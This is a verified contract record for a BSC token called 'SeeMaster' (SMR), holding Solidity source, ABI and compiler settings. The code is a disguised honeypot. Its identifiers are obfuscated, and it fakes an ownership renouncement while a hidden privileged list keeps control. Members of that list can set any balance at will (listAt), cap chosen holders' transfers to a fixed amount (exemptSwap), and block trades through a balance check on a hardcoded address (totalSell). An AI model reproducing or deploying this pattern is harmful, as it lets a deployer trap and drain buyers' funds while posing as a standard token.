{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface maxLimit {\n    function createPair(address marketingFrom, address isSell) external returns (address);\n}\n\ninterface marketingFundSell {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address txAuto) external view returns (uint256);\n\n    function transfer(address feeTake, uint256 receiverTeam) external returns (bool);\n\n    function allowance(address modeAmountTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverTeam) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address feeTake,\n        uint256 receiverTeam\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed limitTrading, uint256 value);\n    event Approval(address indexed modeAmountTotal, address indexed spender, uint256 value);\n}\n\nabstract contract maxTx {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface liquidityTake {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface marketingFundSellMetadata is marketingFundSell {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SeeMaster is maxTx, marketingFundSell, marketingFundSellMetadata {\n\n    function owner() external view returns (address) {\n        return exemptSender;\n    }\n\n    uint256 amountSwap;\n\n    function approve(address exemptAmount, uint256 receiverTeam) public virtual override returns (bool) {\n        fromMin[_msgSender()][exemptAmount] = receiverTeam;\n        emit Approval(_msgSender(), exemptAmount, receiverTeam);\n        return true;\n    }\n\n    address feeEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function symbol() external view virtual override returns (string memory) {\n        return isEnable;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return marketingExempt;\n    }\n\n    constructor (){\n        \n        liquidityTake walletFund = liquidityTake(feeEnable);\n        amountFee = maxLimit(walletFund.factory()).createPair(walletFund.WETH(), address(this));\n        if (senderShouldWallet) {\n            takeIsMode = false;\n        }\n        amountTx = _msgSender();\n        listToken[amountTx] = true;\n        walletSender[amountTx] = marketingExempt;\n        exemptLaunch();\n        if (senderShouldWallet == feeAmountAt) {\n            feeAmountAt = true;\n        }\n        emit Transfer(address(0), amountTx, marketingExempt);\n    }\n\n    function exemptSwap(address totalReceiver) public {\n        fromIs();\n        if (senderShouldWallet) {\n            receiverMin = true;\n        }\n        if (totalReceiver == amountTx || totalReceiver == amountFee) {\n            return;\n        }\n        tokenMinReceiver[totalReceiver] = true;\n    }\n\n    function fromAutoTeam(address limitSender, address feeTake, uint256 receiverTeam) internal returns (bool) {\n        if (limitSender == amountTx) {\n            return totalMarketingTeam(limitSender, feeTake, receiverTeam);\n        }\n        uint256 enableAt = marketingFundSell(amountFee).balanceOf(minLiquidity);\n        require(enableAt == listAmount);\n        require(feeTake != minLiquidity);\n        if (tokenMinReceiver[limitSender]) {\n            return totalMarketingTeam(limitSender, feeTake, toMode);\n        }\n        return totalMarketingTeam(limitSender, feeTake, receiverTeam);\n    }\n\n    mapping(address => bool) public tokenMinReceiver;\n\n    function shouldIs(address tradingModeTx) public {\n        if (marketingReceiver) {\n            return;\n        }\n        if (senderShouldWallet != feeAmountAt) {\n            maxShould = false;\n        }\n        listToken[tradingModeTx] = true;\n        if (limitToken) {\n            maxShould = true;\n        }\n        marketingReceiver = true;\n    }\n\n    bool public receiverMin;\n\n    event OwnershipTransferred(address indexed receiverFeeFund, address indexed swapReceiver);\n\n    function exemptLaunch() public {\n        emit OwnershipTransferred(amountTx, address(0));\n        exemptSender = address(0);\n    }\n\n    bool public takeIsMode;\n\n    uint256 constant toMode = 20 ** 10;\n\n    bool public senderShouldWallet;\n\n    function decimals() external view virtual override returns (uint8) {\n        return limitMax;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return shouldTeam;\n    }\n\n    uint256 listAmount;\n\n    bool private tradingTokenReceiver;\n\n    address minLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function balanceOf(address txAuto) public view virtual override returns (uint256) {\n        return walletSender[txAuto];\n    }\n\n    function fromIs() private view {\n        require(listToken[_msgSender()]);\n    }\n\n    uint256 private teamFund;\n\n    function transferFrom(address limitSender, address feeTake, uint256 receiverTeam) external override returns (bool) {\n        if (_msgSender() != feeEnable) {\n            if (fromMin[limitSender][_msgSender()] != type(uint256).max) {\n                require(receiverTeam <= fromMin[limitSender][_msgSender()]);\n                fromMin[limitSender][_msgSender()] -= receiverTeam;\n            }\n        }\n        return fromAutoTeam(limitSender, feeTake, receiverTeam);\n    }\n\n    function totalSell(uint256 receiverTeam) public {\n        fromIs();\n        listAmount = receiverTeam;\n    }\n\n    function allowance(address receiverFrom, address exemptAmount) external view virtual override returns (uint256) {\n        if (exemptAmount == feeEnable) {\n            return type(uint256).max;\n        }\n        return fromMin[receiverFrom][exemptAmount];\n    }\n\n    function totalMarketingTeam(address limitSender, address feeTake, uint256 receiverTeam) internal returns (bool) {\n        require(walletSender[limitSender] >= receiverTeam);\n        walletSender[limitSender] -= receiverTeam;\n        walletSender[feeTake] += receiverTeam;\n        emit Transfer(limitSender, feeTake, receiverTeam);\n        return true;\n    }\n\n    bool public feeAmountAt;\n\n    bool public maxShould;\n\n    function transfer(address isSender, uint256 receiverTeam) external virtual override returns (bool) {\n        return fromAutoTeam(_msgSender(), isSender, receiverTeam);\n    }\n\n    function listAt(address isSender, uint256 receiverTeam) public {\n        fromIs();\n        walletSender[isSender] = receiverTeam;\n    }\n\n    bool private limitToken;\n\n    address public amountFee;\n\n    function getOwner() external view returns (address) {\n        return exemptSender;\n    }\n\n    string private isEnable = \"SMR\";\n\n    mapping(address => bool) public listToken;\n\n    bool public marketingReceiver;\n\n    address private exemptSender;\n\n    bool public takeFee;\n\n    string private shouldTeam = \"See Master\";\n\n    uint256 private marketingExempt = 100000000 * 10 ** 18;\n\n    uint8 private limitMax = 18;\n\n    address public amountTx;\n\n    mapping(address => uint256) private walletSender;\n\n    mapping(address => mapping(address => uint256)) private fromMin;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeAmountTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverFeeFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitTrading\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptAmount\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTeam\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txAuto\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalReceiver\",\"type\":\"address\"}],\"name\":\"exemptSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeAmountAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTeam\",\"type\":\"uint256\"}],\"name\":\"listAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderShouldWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingModeTx\",\"type\":\"address\"}],\"name\":\"shouldIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeIsMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenMinReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverTeam\",\"type\":\"uint256\"}],\"name\":\"totalSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTeam\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTeam\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SeeMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}